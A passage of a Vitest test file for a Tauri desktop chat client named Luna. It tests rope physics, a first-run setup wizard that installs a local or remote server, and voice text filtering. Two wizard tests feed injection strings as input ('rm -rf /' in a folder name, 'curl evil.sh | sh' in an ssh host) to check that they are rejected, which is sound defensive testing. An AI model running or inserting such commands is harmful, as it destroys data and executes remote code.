      vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(true)
      const retract = vi.spyOn(m.MoonString, 'retract').mockImplementation(() => {})
      m.WebSocketEngine.reTether()             // the pull gesture — NO snapshot has arrived
      expect(retract).toHaveBeenCalledWith(true)
      // The retract's onRetracted hook owns the window restore now; the stashed
      // grow promise must be dropped or onReattached would restore a second time.
      expect(m.State.growPromise).toBeNull()
    })

    it('Scenario: after a pull-retract has finished, onReattached is just the status flip (no second restore, no second retract)', async () => {
      const m = M()
      m.State.growPromise = null               // reTether dropped it at pull time
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false) // retract already finished
      const retract = vi.spyOn(m.MoonString, 'retract').mockImplementation(() => {})
      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
      await m.WebSocketEngine.onReattached()
      expect(retract).not.toHaveBeenCalled()
      expect(restore).not.toHaveBeenCalled()   // onRetracted already collapsed the window
      expect(document.getElementById('connection-status')!.className).toBe('connected')
    })
  })

  // ── Window-drag rope physics + click-through region ───────────────────────
  // Dragging the WINDOW fires no JS pointer events (native drag), so onMoved
  // deltas are injected into the rope as apparent velocity; and while the
  // string is live the webview publishes the clickable region (moon + rope)
  // so the Rust cursor poll can make the empty envelope click-through.
  // jsdom can't run the rAF loop or the Rust poll — these test the contracts:
  // the velocity-injection math and the region-publish lifecycle.
  describe('Feature: window-drag rope physics + click-through region', () => {
    const M = () => (window as any).__MoonInternals

    beforeEach(() => {
      // No-op rAF: these tests call the REAL MoonString.show(), whose loop
      // re-arms rAF every frame — the SYNCHRONOUS rAF leaked by the frame-
      // pipeline suite would recurse it into a stack overflow. A no-op also
      // freezes the physics, so points move ONLY via the injection under test.
      ;(window as any).requestAnimationFrame = () => 0
      ;(window as any).cancelAnimationFrame = () => {}
    })

    function stubInvoke() {
      const invoke = vi.fn().mockResolvedValue(undefined)
      ;(window as any).__TAURI__.core = { invoke }
      return invoke
    }

    it('Scenario: a window move shifts FREE points as velocity (positions move, prev-positions stay, anchor pinned)', () => {
      const m = M()
      stubInvoke()
      m.MoonString.show()
      const before = m.MoonString.getPoints()
      expect(before.length).toBeGreaterThan(2)

      m.MoonString.injectWindowDelta(50, 20)   // window dragged +50,+20 logical px

      const after = m.MoonString.getPoints()
      // Anchor (i=0) stays pinned to the moon — never shifted by the inject.
      expect(after[0].x).toBe(before[0].x)
      expect(after[0].y).toBe(before[0].y)
      for (let i = 1; i < after.length; i++) {
        // Free points trail the window: position shifts opposite the delta...
        expect(after[i].x - before[i].x).toBeCloseTo(-50, 5)
        expect(after[i].y - before[i].y).toBeCloseTo(-20, 5)
        // ...but prev-positions DON'T move, which is what makes Verlet read the
        // shift as velocity (the swing) instead of a teleport.
        expect(after[i].px).toBe(before[i].px)
        expect(after[i].py).toBe(before[i].py)
      }
    })

    it('Scenario: per-event delta is clamped (a coalesced full-screen jump injects a swing, not an explosion)', () => {
      const m = M()
      stubInvoke()
      m.MoonString.show()
      const before = m.MoonString.getPoints()
      m.MoonString.injectWindowDelta(1200, -900)  // e.g. paint frozen during drag → one fat delta
      const after = m.MoonString.getPoints()
      expect(after[1].x - before[1].x).toBeCloseTo(-80, 5)  // clamped to ±80
      expect(after[1].y - before[1].y).toBeCloseTo(80, 5)
    })

    it('Scenario: injection is a no-op when the string is not live', () => {
      const m = M()
      stubInvoke()
      m.MoonString.show()
      m.MoonString.hideImmediate()             // live=false, points remain
      const before = m.MoonString.getPoints()
      m.MoonString.injectWindowDelta(50, 50)
      expect(m.MoonString.getPoints()).toEqual(before)
    })

    it('Scenario: show() publishes the interactive region; hideImmediate() clears it', () => {
      const m = M()
      const invoke = stubInvoke()
      m.MoonString.show()
      const enable = invoke.mock.calls.find((c: any[]) => c[0] === 'set_interactive_region')
      expect(enable).toBeTruthy()
      expect(enable![1].enabled).toBe(true)
      expect(enable![1].rects).toHaveLength(2)            // moon rect + rope bbox
      for (const r of enable![1].rects) expect(r).toHaveLength(4)

      invoke.mockClear()
      m.MoonString.hideImmediate()
      const disable = invoke.mock.calls.find((c: any[]) => c[0] === 'set_interactive_region')
      expect(disable).toBeTruthy()
      expect(disable![1].enabled).toBe(false)              // whole window interactive again
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Setup wizard (first-run installer)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Setup wizard (first-run installer)', () => {
    const M = () => (window as any).__MoonInternals
    const W = () => M().SetupWizard
    const panel = () => document.getElementById('setup-wizard')!
    const activeStep = () =>
      (panel().querySelector('.wizard-step.active') as HTMLElement)?.dataset.step

    function stubCore(handler: (cmd: string, args: any) => any) {
      const invoke = vi.fn().mockImplementation((cmd: string, args: any) =>
        Promise.resolve(handler(cmd, args)))
      ;(window as any).__TAURI__.core = { invoke }
      return invoke
    }

    it('Scenario: first run (no stored connection) -> wizard auto-opens', async () => {
      stubCore((cmd) => (cmd === 'load_connection' ? {} : undefined))
      await W().maybeAutoOpen()
      expect(panel().classList.contains('active')).toBe(true)
      expect(activeStep()).toBe('welcome')
    })

    it('Scenario: a connection already exists -> wizard stays closed and marks setup complete', async () => {
      stubCore((cmd) => (cmd === 'load_connection' ? { wsUrl: 'ws://10.0.0.5:4753/ui' } : undefined))
      await W().maybeAutoOpen()
      expect(panel().classList.contains('active')).toBe(false)
      expect(localStorage.getItem('luna.moon.setupComplete')).toBe('1')
    })

    it('Scenario: setup already completed once -> never auto-opens again', async () => {
      localStorage.setItem('luna.moon.setupComplete', '1')
      const invoke = stubCore(() => ({}))
      await W().maybeAutoOpen()
      expect(panel().classList.contains('active')).toBe(false)
      expect(invoke).not.toHaveBeenCalled()   // short-circuits before any IPC
    })

    it('Scenario: outside a real Tauri runtime (no __TAURI__.core) -> auto-open is inert', async () => {
      await W().maybeAutoOpen()               // shared beforeEach mocks window only, no .core
      expect(panel().classList.contains('active')).toBe(false)
    })

    it('Scenario: opening the wizard ENDS a live tether episode — buttons stay clickable (regression)', async () => {
      // First run is always disconnected, so the string episode is the COMMON
      // first-run state: it flips everything outside the moon+rope rects
      // native-click-through. If the wizard opens without tearing it down,
      // every wizard button paints fine and is dead to real clicks.
      stubCore(() => undefined)
      document.getElementById('chat-panel')!.classList.remove('active')
      let live = false
      vi.spyOn(M().MoonString, 'isLive').mockImplementation(() => live)
      const show = vi.spyOn(M().MoonString, 'show').mockImplementation(() => { live = true })
      const hide = vi.spyOn(M().MoonString, 'hideImmediate').mockImplementation(() => { live = false })
      vi.spyOn(M().TauriService, 'growToEnvelope').mockResolvedValue(undefined)
      const restore = vi.spyOn(M().TauriService, 'restoreCollapsed').mockResolvedValue(undefined)

      M().WebSocketEngine.showTether()         // string drops while collapsed
      await Promise.resolve(); await Promise.resolve()
      expect(show).toHaveBeenCalledTimes(1)    // episode live → region owns the window

      await W().open()
      expect(hide).toHaveBeenCalledTimes(1)    // hideImmediate cleared the click-through region
      expect(restore).toHaveBeenCalledTimes(1) // envelope restored before the wizard resize
      expect(M().State.growPromise).toBeNull() // episode bookkeeping fully cleared
      expect(M().State.tetherPendingOnCollapse).toBe(true) // string returns after the wizard
      expect(panel().classList.contains('active')).toBe(true)
    })

    it('Scenario: a disconnect while the wizard is open DEFERS the string drop (no click-through under the wizard)', async () => {
      stubCore(() => undefined)
      document.getElementById('chat-panel')!.classList.remove('active')
      const show = vi.spyOn(M().MoonString, 'show').mockImplementation(() => {})
      const grow = vi.spyOn(M().TauriService, 'growToEnvelope').mockResolvedValue(undefined)
      await W().open()
      M().WebSocketEngine.showTether()         // grace timer fires mid-wizard
      await Promise.resolve(); await Promise.resolve()
      expect(grow).not.toHaveBeenCalled()      // no envelope grow under the wizard
      expect(show).not.toHaveBeenCalled()
      expect(M().State.tetherPendingOnCollapse).toBe(true)
    })

    it('Scenario: closing the wizard hands the window to a deferred string instead of a plain collapse', async () => {
      stubCore(() => undefined)
      document.getElementById('chat-panel')!.classList.remove('active')
      const showTether = vi.spyOn(M().WebSocketEngine, 'showTether').mockImplementation(() => {})
      await W().open()                          // collapsed → _openedMinimized = true
      M().State.tetherPendingOnCollapse = true  // a drop was deferred meanwhile
      W().close({ complete: true })
      vi.advanceTimersByTime(250)
      expect(showTether).toHaveBeenCalledTimes(1)
    })

    it('Scenario: Begin -> path step; picking each card routes to its flow; closing marks complete', () => {
      stubCore(() => undefined)
      W().open()
      document.getElementById('wizard-begin')!.click()
      expect(activeStep()).toBe('path')

      ;(panel().querySelector('[data-path="local"]') as HTMLElement).click()
      expect(activeStep()).toBe('local')
      document.getElementById('wizard-local-back')!.click()

      ;(panel().querySelector('[data-path="remote"]') as HTMLElement).click()
      expect(activeStep()).toBe('remote')
      document.getElementById('wizard-remote-back')!.click()

      ;(panel().querySelector('[data-path="connect"]') as HTMLElement).click()
      expect(activeStep()).toBe('connect')

      document.getElementById('wizard-close-x')!.click()
      expect(panel().classList.contains('active')).toBe(false)
      expect(localStorage.getItem('luna.moon.setupComplete')).toBe('1')
    })

    it('Scenario: progress beads track the journey (path=1, config=2, connect=3, done=4)', () => {
      stubCore(() => undefined)
      W().open()
      const beads = () => Array.from(panel().querySelectorAll('.wizard-bead'))
      expect(beads()[0].classList.contains('active')).toBe(true)
      W().goTo('path')
      expect(beads()[1].classList.contains('active')).toBe(true)
      expect(beads()[0].classList.contains('done')).toBe(true)
      W().goTo('local')
      expect(beads()[2].classList.contains('active')).toBe(true)
      W().goTo('connect')
      expect(beads()[3].classList.contains('active')).toBe(true)
      W().goTo('done')
      expect(beads()[4].classList.contains('active')).toBe(true)
      expect(beads().slice(0, 4).every((b) => b.classList.contains('done'))).toBe(true)
    })

    it('Scenario: connect test hears the hello frame -> success status with build identity', async () => {
      const sockets: any[] = []
      class FakeWS {
        url: string
        onmessage: any; onclose: any; onerror: any
        constructor(url: string) { this.url = url; sockets.push(this) }
        close() {}
      }
      ;(window as any).WebSocket = FakeWS

      W().open()
      W().chosenPath = 'connect'
      W().goTo('connect')
      const urlInput = document.getElementById('wizard-connect-url') as HTMLInputElement
      const tokenInput = document.getElementById('wizard-connect-token') as HTMLInputElement
      urlInput.value = 'ws://moonbase:4753/ui'
      tokenInput.value = 'sekrit'

      const testPromise = W().runConnectTest()
      await Promise.resolve()
      expect(sockets).toHaveLength(1)
      // The probe carries the token as a query param, like the real engine.
      expect(sockets[0].url).toBe('ws://moonbase:4753/ui?token=sekrit')

      sockets[0].onmessage({ data: JSON.stringify({ type: 'hello', protocolVersion: 2, buildSha: 'abc1234' }) })
      const ok = await testPromise
      expect(ok).toBe(true)
      const status = document.getElementById('wizard-connect-status')!
      expect(status.textContent).toContain('Found Luna')
      expect(status.textContent).toContain('abc1234')
      expect(status.classList.contains('ok')).toBe(true)
    })

    it('Scenario: connect test refused (socket closes) -> failure status, finish still possible', async () => {
      const sockets: any[] = []
      class FakeWS {
        onmessage: any; onclose: any; onerror: any
        constructor(_url: string) { sockets.push(this) }
        close() {}
      }
      ;(window as any).WebSocket = FakeWS

      W().open()
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://nowhere:4753/ui'
      const testPromise = W().runConnectTest()
      await Promise.resolve()
      sockets[0].onclose({ code: 1006 })
      const ok = await testPromise
      expect(ok).toBe(false)
      const status = document.getElementById('wizard-connect-status')!
      expect(status.classList.contains('fail')).toBe(true)
    })

    function fakeWsClass(sockets: any[]) {
      return class FakeWS {
        url: string
        onmessage: any; onclose: any; onerror: any; onopen: any
        readyState = 0
        constructor(url: string) { this.url = url; sockets.push(this) }
        close() {}
        send() {}
        addEventListener() {}      // WebSocketEngine.connect wires via listeners
        removeEventListener() {}
      }
    }

    it('Scenario: Save & finish verifies the hello FIRST, then persists, reconnects, and celebrates', async () => {
      const sockets: any[] = []
      ;(window as any).WebSocket = fakeWsClass(sockets)
      const invoke = stubCore(() => undefined)

      W().open()
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://moonbase:4753/ui'
      ;(document.getElementById('wizard-connect-token') as HTMLInputElement).value = 'sekrit'

      const pending = W().finish()
      // Nothing persisted yet — the probe is still listening.
      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeFalsy()
      sockets[0].onmessage({ data: JSON.stringify({ type: 'hello', protocolVersion: 2 }) })
      await pending

      const saved = invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')
      expect(saved).toBeTruthy()
      expect(saved![1]).toEqual({ url: 'ws://moonbase:4753/ui', token: 'sekrit' })
      expect(M().State.wsUrl).toBe('ws://moonbase:4753/ui')
      expect(M().State.wsToken).toBe('sekrit')
      expect(localStorage.getItem('luna_ws_url')).toBe('ws://moonbase:4753/ui')
      expect(localStorage.getItem('luna.moon.setupComplete')).toBe('1')
      expect(activeStep()).toBe('done')
      // Cross-server thread state was reset, same as a Settings server switch.
      expect(M().State.skipLastThreadFile).toBe(true)
    })

    it('Scenario: a setup-mode server surfaces the Claude-login note on the done step', async () => {
      const sockets: any[] = []
      ;(window as any).WebSocket = fakeWsClass(sockets)
      stubCore(() => undefined)

      W().open()
      W().goTo('connect')
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://127.0.0.1:4753/ui'

      const pending = W().finish()
      sockets[0].onmessage({ data: JSON.stringify({
        type: 'hello', protocolVersion: 2,
        capabilities: { chat: false, setup: true },
      }) })
      await pending

      expect(activeStep()).toBe('done')
      const note = document.getElementById('wizard-done-setup') as HTMLElement
      expect(note.hidden).toBe(false)
      expect(note.textContent).toContain('claude setup-token')
      expect(document.getElementById('wizard-done-title')!.textContent).toContain('one last step')
    })

    it('Scenario: a chat-ready server keeps the done step clean (no setup note)', async () => {
      const sockets: any[] = []
      ;(window as any).WebSocket = fakeWsClass(sockets)
      stubCore(() => undefined)

      W().open()
      W().goTo('connect')
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://127.0.0.1:4753/ui'

      const pending = W().finish()
      sockets[0].onmessage({ data: JSON.stringify({
        type: 'hello', protocolVersion: 2,
        capabilities: { chat: true, setup: false },
      }) })
      await pending

      expect(activeStep()).toBe('done')
      expect((document.getElementById('wizard-done-setup') as HTMLElement).hidden).toBe(true)
      expect(document.getElementById('wizard-done-title')!.textContent).toBe('Luna is tethered')
    })

    it('Scenario: failed probe blocks the save; the button re-arms as an explicit "Save anyway"', async () => {
      const sockets: any[] = []
      ;(window as any).WebSocket = fakeWsClass(sockets)
      const invoke = stubCore(() => undefined)

      W().open()
      W().goTo('connect')
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://nowhere:4753/ui'

      const firstClick = W().finish()
      sockets[0].onclose({ code: 1006 })
      await firstClick

      // Refused ⇒ nothing saved, button now offers the explicit override.
      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeFalsy()
      const finishBtn = document.getElementById('wizard-finish-btn')!
      expect(finishBtn.textContent).toBe('Save anyway')
      expect(activeStep()).toBe('connect')

      await W().finish()   // second click: forceSave skips the probe
      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeTruthy()
      expect(activeStep()).toBe('done')
      // Guard resets for the next visitor of the step.
      expect(finishBtn.textContent).toBe('Save & finish')
    })

    it('Scenario: a first frame that is NOT hello reads as "not Luna", never success', async () => {
      const sockets: any[] = []
      ;(window as any).WebSocket = fakeWsClass(sockets)

      W().open()
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://some-other-service/ws'
      const testPromise = W().runConnectTest()
      sockets[0].onmessage({ data: JSON.stringify({ type: 'thread-list', threads: [] }) })
      const ok = await testPromise
      expect(ok).toBe(false)
      const status = document.getElementById('wizard-connect-status')!
      expect(status.classList.contains('fail')).toBe(true)
      expect(status.textContent).toContain('doesn’t sound like Luna')
    })

    it('Scenario: fresh Mac -> install runs the real steps in order and starts the server', async () => {
      const commands: string[] = []
      let healthzCalls = 0
      stubCore((cmd, args) => {
        if (cmd !== 'local_shell_exec') return undefined
        const c = args.command as string
        commands.push(c)
        if (c.includes('healthz')) {
          healthzCalls++
          // 1st = detection probe (no server), 2nd = wake-step probe (still
          // none → must start), 3rd+ = heartbeat after start (alive).
          return { exitCode: healthzCalls >= 3 ? 0 : 1, stdout: '', stderr: '', durationMs: 4, timedOut: false }
        }
        if (c.includes('"$HOME/luna/.git" ]')) {
          return { exitCode: 1, stdout: '', stderr: '', durationMs: 1, timedOut: false } // no repo yet
        }
        return { exitCode: 0, stdout: 'ok', stderr: '', durationMs: 5, timedOut: false }
      })

      W().open()
      await W()._detectPromise
      expect(W().env).toEqual({ serverRunning: false, repoExists: false })
      // Fresh Mac → no detection banner, install wording.
      expect((document.getElementById('wizard-detect-note') as HTMLElement).hidden).toBe(true)
      expect(document.getElementById('wizard-local-start')!.textContent).toBe('Install & start')

      W().choosePath('local')
      await W().runLocalInstall()

      expect(activeStep()).toBe('progress')
      // Order of operations (after the 2 detection probes): git check → bun
      // check → clone → bun install → ~/.luna seed → wake probe → start → heartbeat.
      const install = commands.slice(2)
      expect(install[0]).toContain('command -v git')
      expect(install[1]).toContain('command -v bun')
      expect(install[2]).toContain('git clone https://github.com/fourcolors/luna.git')
      expect(install[2]).toContain('LUNA_DIR="$HOME/luna"')   // ~ expanded by the SHELL
      expect(install[3]).toContain('bun install')
      expect(install[4]).toContain('LUNA_REPO_ROOT')
      // UI_WS_TOKEN is a HARD boot requirement (resolveUiWsToken throws) — a
      // fresh install must mint one or the launchd server crash-loops and the
      // heartbeat times out. Existing tokens are preserved (grep -q guard).
      expect(install[4]).toContain('grep -q "^UI_WS_TOKEN="')
      expect(install[4]).toContain('openssl rand -hex 24')
      // Every command gets the PATH prelude (a .app inherits launchd's PATH).
      for (const c of commands) expect(c).toContain('$HOME/.bun/bin')

      // No server answered the wake probe ⇒ the supervised start actually ran:
      // the shared plist lib is sourced, the plist lands where launchd rescans
      // at login (survives reboot), and bootstrap+kickstart bring her up.
      const wake = commands.find((c) => c.includes('launchctl bootstrap'))!
      expect(wake).toBeTruthy()
      expect(wake).toContain('scripts/lib/launchd-plist.sh')
      expect(wake).toContain('Library/LaunchAgents')
      expect(wake).toContain('com.user.luna-chat-server')
      expect(wake).toContain('launchctl kickstart')
      // The unsupervised nohup start is gone for good.
      expect(commands.some((c) => c.includes('nohup'))).toBe(false)
      // Fresh install never pauses an old server.
      expect(commands.some((c) => c.includes('pkill'))).toBe(false)

      const rows = Array.from(document.querySelectorAll('#wizard-progress-list .wizard-task'))
      expect(rows).toHaveLength(7)
      expect(rows.every((r) => r.classList.contains('ok'))).toBe(true)
      expect((document.getElementById('wizard-progress-next') as HTMLElement).hidden).toBe(false)
    })

    it('Scenario: Luna already lives here -> update mode (settle-pause + restart, update wording, connect shortcut)', async () => {
      const commands: string[] = []
      stubCore((cmd, args) => {
        if (cmd !== 'local_shell_exec') return undefined
        const c = args.command as string
        commands.push(c)
        return { exitCode: 0, stdout: 'ok', stderr: '', durationMs: 5, timedOut: false } // server up, repo present
      })

      W().open()
      await W()._detectPromise
      expect(W().env).toEqual({ serverRunning: true, repoExists: true })

      // The path step announces the find; the local step speaks "update".
      const note = document.getElementById('wizard-detect-note') as HTMLElement
      expect(note.hidden).toBe(false)
      expect(note.textContent).toContain('already running')
      expect(document.getElementById('wizard-path-local-desc')!.textContent).toContain('update')

      W().choosePath('local')
      expect(document.getElementById('wizard-local-title')!.textContent).toContain('Update Luna')
      expect(document.getElementById('wizard-local-start')!.textContent).toBe('Update & restart')
      expect((document.getElementById('wizard-local-connect') as HTMLElement).hidden).toBe(false)

      await W().runLocalInstall()

      // Update flow: pull (not a fresh clone path choice — same command, repo
      // branch wins), settle-pause the old server, then a supervised restart.
      // The pause MUST bootout the LaunchAgent BEFORE the 6s settle (else
      // KeepAlive respawns the old server mid-settle) and still pkill-sweeps
      // legacy nohup-era servers.
      const pause = commands.find((c) => c.includes('sleep 6'))!
      expect(pause).toBeTruthy()
      expect(pause.indexOf('launchctl bootout')).toBeGreaterThanOrEqual(0)
      expect(pause.indexOf('launchctl bootout')).toBeLessThan(pause.indexOf('sleep 6'))
      expect(pause).toContain('pkill -f "ui-web.*server:chat"')
      expect(commands.some((c) => c.includes('launchctl bootstrap') && c.includes('launchctl kickstart'))).toBe(true)
      expect(commands.some((c) => c.includes('nohup'))).toBe(false)

      const rows = Array.from(document.querySelectorAll('#wizard-progress-list .wizard-task'))
      expect(rows).toHaveLength(8)                            // + "Tucking the old Luna in"
      expect(rows.every((r) => r.classList.contains('ok'))).toBe(true)
    })

    it('Scenario: "Just connect to it" shortcut jumps to connect prefilled with localhost', async () => {
      stubCore((cmd) => (cmd === 'local_shell_exec'
        ? { exitCode: 0, stdout: '', stderr: '', durationMs: 2, timedOut: false }
        : undefined))
      W().open()
      await W()._detectPromise
      W().choosePath('local')
      const shortcut = document.getElementById('wizard-local-connect') as HTMLElement
      expect(shortcut.hidden).toBe(false)
      shortcut.click()
      expect(activeStep()).toBe('connect')
      expect((document.getElementById('wizard-connect-url') as HTMLInputElement).value)
        .toBe('ws://127.0.0.1:4753/ui')

      // Back from here must return to the local FORM, not an empty progress
      // screen — no install run ever happened on this path.
      document.getElementById('wizard-connect-back')!.click()
      expect(activeStep()).toBe('local')
    })

    it('Scenario: local install failure paints the bead red, shows the log, and offers Back', async () => {
      stubCore((cmd) => {
        if (cmd !== 'local_shell_exec') return undefined
        return { exitCode: 1, stdout: '', stderr: 'sh: git: command not found', durationMs: 3, timedOut: false }
      })

      W().open()
      W().choosePath('local')
      await W().runLocalInstall()

      const rows = Array.from(document.querySelectorAll('#wizard-progress-list .wizard-task'))
      expect(rows[0].classList.contains('fail')).toBe(true)
      expect(rows[1].classList.contains('ok')).toBe(false)   // never reached
      const log = document.getElementById('wizard-progress-log') as HTMLElement
      expect(log.hidden).toBe(false)
      expect(log.textContent).toContain('git: command not found')
      expect((document.getElementById('wizard-progress-back') as HTMLElement).hidden).toBe(false)
      expect((document.getElementById('wizard-progress-next') as HTMLElement).hidden).toBe(true)
    })

    it('Scenario: a hostile install folder is rejected before any install command runs', async () => {
      const invoke = stubCore(() => ({ exitCode: 0, stdout: '', stderr: '', durationMs: 1, timedOut: false }))
      W().open()
      await W()._detectPromise                               // detection probes are read-only
      W().choosePath('local')
      ;(document.getElementById('wizard-local-dir') as HTMLInputElement).value = '~/luna"; rm -rf /; "'
      await W().runLocalInstall()
      // No mutating install command ever reached the shell (detection's two
      // read-only probes are the only local_shell_exec calls).
      const shellCmds = invoke.mock.calls
        .filter((c: any[]) => c[0] === 'local_shell_exec')
        .map((c: any[]) => c[1].command as string)
      expect(shellCmds.some((c) => c.includes('git clone') || c.includes('launchctl') || c.includes('mkdir'))).toBe(false)
      expect(activeStep()).toBe('local')                     // still on the form
    })

    it('Scenario: arriving at connect on the local path reads UI_WS_TOKEN into the secret field', async () => {
      stubCore((cmd, args) => {
        if (cmd !== 'local_shell_exec') return undefined
        const c = args.command as string
        if (c.includes('grep "^UI_WS_TOKEN=')) {
          return { exitCode: 0, stdout: 'UI_WS_TOKEN=tok_abc123456789\n', stderr: '', durationMs: 2, timedOut: false }
        }
        return { exitCode: 1, stdout: '', stderr: '', durationMs: 1, timedOut: false }
      })
      W().open()
      W().chosenPath = 'local'
      const tokenInput = document.getElementById('wizard-connect-token') as HTMLInputElement
      tokenInput.value = ''
      W().goTo('connect')
      for (let i = 0; i < 6; i++) await Promise.resolve()
      expect(tokenInput.value).toBe('tok_abc123456789')
    })

    it('Scenario: a token the user already typed is never overwritten by the .env read', async () => {
      stubCore((cmd, args) => {
        if (cmd !== 'local_shell_exec') return undefined
        const c = args.command as string
        if (c.includes('grep "^UI_WS_TOKEN=')) {
          return { exitCode: 0, stdout: 'UI_WS_TOKEN=from-env-file\n', stderr: '', durationMs: 2, timedOut: false }
        }
        return { exitCode: 1, stdout: '', stderr: '', durationMs: 1, timedOut: false }
      })
      W().open()
      W().chosenPath = 'local'
      const tokenInput = document.getElementById('wizard-connect-token') as HTMLInputElement
      tokenInput.value = 'my-own-secret'
      W().goTo('connect')
      for (let i = 0; i < 6; i++) await Promise.resolve()
      expect(tokenInput.value).toBe('my-own-secret')
    })

    it('Scenario: remote step writes a tailored install one-liner and prefills the connect URL', () => {
      stubCore(() => undefined)
      W().open()
      W().choosePath('remote')

      const host = document.getElementById('wizard-remote-host') as HTMLInputElement
      host.value = 'root@moonbase'
      host.dispatchEvent(new Event('input', { bubbles: true }))

      const cmd = document.getElementById('wizard-remote-cmd')!.textContent!
      expect(cmd).toContain('ssh -t root@moonbase')
      expect(cmd).toContain('git clone https://github.com/fourcolors/luna.git')
      expect(cmd).toContain('luna-server-install')
      expect(cmd).toContain('UI_WS_TOKEN')                   // surfaces the token to paste back

      document.getElementById('wizard-remote-continue')!.click()
      expect(activeStep()).toBe('connect')
      expect((document.getElementById('wizard-connect-url') as HTMLInputElement).value)
        .toBe('ws://moonbase:4753/ui')                       // user@ stripped, ws guessed
    })

    it('Scenario: an ssh destination with quotes/spaces never reaches the generated one-liner', () => {
      stubCore(() => undefined)
      W().open()
      W().choosePath('remote')

      const host = document.getElementById('wizard-remote-host') as HTMLInputElement
      host.value = `bad host'; curl evil.sh | sh; '`
      host.dispatchEvent(new Event('input', { bubbles: true }))

      const cmd = document.getElementById('wizard-remote-cmd')!.textContent!
      expect(cmd).toContain('ssh -t user@your-server')       // placeholder fallback
      expect(cmd).not.toContain('evil.sh')
      expect(W()._remoteWsGuess).toBe('')                    // no bogus prefill either
    })

    it('Scenario: Settings → Connection has a re-entry point for the wizard', () => {
      stubCore(() => undefined)
      const settingsPanel = document.getElementById('settings-panel')!
      settingsPanel.classList.add('active')
      document.getElementById('open-wizard-btn')!.click()
      expect(settingsPanel.classList.contains('active')).toBe(false)
      expect(panel().classList.contains('active')).toBe(true)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Voice — sentence splitter (pure function, VOICE.md)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Voice sentence splitter (pure)', () => {
    const split = (s: string) => (window as any).__MoonInternals.splitSpeakableSentences(s)

    it('splits complete sentences and keeps the trailing fragment as rest', () => {
      const r = split('Hello there. How are you? I am')
      expect(r.sentences).toEqual(['Hello there.', 'How are you?'])
      expect(r.rest).toBe('I am')
    })

    it('does NOT split an abbrev-ish short fragment (<2 words before the boundary)', () => {
      const r = split('Dr. Smith is here. Good')
      // "Dr." alone is 1 word -> no boundary; the real sentence end splits.
      expect(r.sentences).toEqual(['Dr. Smith is here.'])
      expect(r.rest).toBe('Good')
    })

    it('treats a closing quote after the terminator as part of the sentence', () => {
      const r = split('He said "stop here." Then left.')
      expect(r.sentences).toEqual(['He said "stop here."'])
      // End-of-buffer is NOT a boundary (a decimal or more text may follow).
      expect(r.rest).toBe('Then left.')
    })

    it('treats a closing paren after the terminator as part of the sentence', () => {
      const r = split('It works (mostly.) And then some')
      expect(r.sentences).toEqual(['It works (mostly.)'])
      expect(r.rest).toBe('And then some')
    })

    it('never splits inside an unclosed ``` fence', () => {
      const r = split('Here is code. ```python\nx = 1. y. z')
      expect(r.sentences).toEqual(['Here is code.'])
      expect(r.rest).toBe('```python\nx = 1. y. z')
    })

    it('splits after a fence CLOSES, keeping the whole block in one chunk', () => {
      const r = split('Look at this. ```js\nfoo(); // first. second\n``` All done. Next')
      expect(r.sentences).toEqual([
        'Look at this.',
        '```js\nfoo(); // first. second\n``` All done.',
      ])
      expect(r.rest).toBe('Next')
    })

    it('does not treat a decimal point as a boundary', () => {
      const r = split('The value is 3.14 and rising. ok')
      expect(r.sentences).toEqual(['The value is 3.14 and rising.'])
      expect(r.rest).toBe('ok')
    })

    it('end-of-buffer terminator stays in rest (flush on message end handles it)', () => {
      const r = split('Working on it.')
      expect(r.sentences).toEqual([])
      expect(r.rest).toBe('Working on it.')
    })

    // Regression (finding: table announced once per row): rows are protected
    // like fences so the whole table lands in ONE chunk → ONE announcement.
    it('never splits inside markdown table rows (cells with sentence punctuation)', () => {
      const r = split('| Tool | Use it. Often. |\n| Saw | Cuts wood. Slowly. |\nAll covered. next')
      expect(r.sentences).toEqual([
        '| Tool | Use it. Often. |\n| Saw | Cuts wood. Slowly. |\nAll covered.',
      ])
      expect(r.rest).toBe('next')
    })

    it('a still-streaming table row stays whole in rest', () => {
      const r = split('| name | description. with periods |')
      expect(r.sentences).toEqual([])
      expect(r.rest).toBe('| name | description. with periods |')
    })

    it('mid-line pipes are NOT table rows (only a line-leading | protects)', () => {
      // toSpeakable's table collapse also requires (^|\n) before the pipe —
      // the splitter must use the same definition so the two stay in sync.
      const r = split('Sure thing. | a. b | more. tail')
      expect(r.sentences[0]).toBe('Sure thing.')
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Voice — speakable filter (pure function, VOICE.md)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Voice speakable filter (pure)', () => {
    const speak = (s: string) => (window as any).__MoonInternals.toSpeakable(s)
    const CODE_MSG = "I've put the code in the chat."
    const TABLE_MSG = "There's a table in the chat."

    it('replaces a fenced code block with the code announcement', () => {
      expect(speak('Here:\n```js\nconst a = 1;\n```\nDone'))
        .toBe(`Here: ${CODE_MSG} Done`)
    })

    it('announces a CONSECUTIVE run of fenced blocks only once', () => {
      const out = speak('```a\nx\n```\n\n```b\ny\n```')
      expect(out).toBe(CODE_MSG)
    })

    it('announces two runs separated by prose twice', () => {
      const out = speak('```a\nx\n``` then words ```b\ny\n```')
      expect(out.split(CODE_MSG).length - 1).toBe(2)
      expect(out).toContain('then words')
    })

    it('announces an unclosed (mid-stream flushed) fence too', () => {
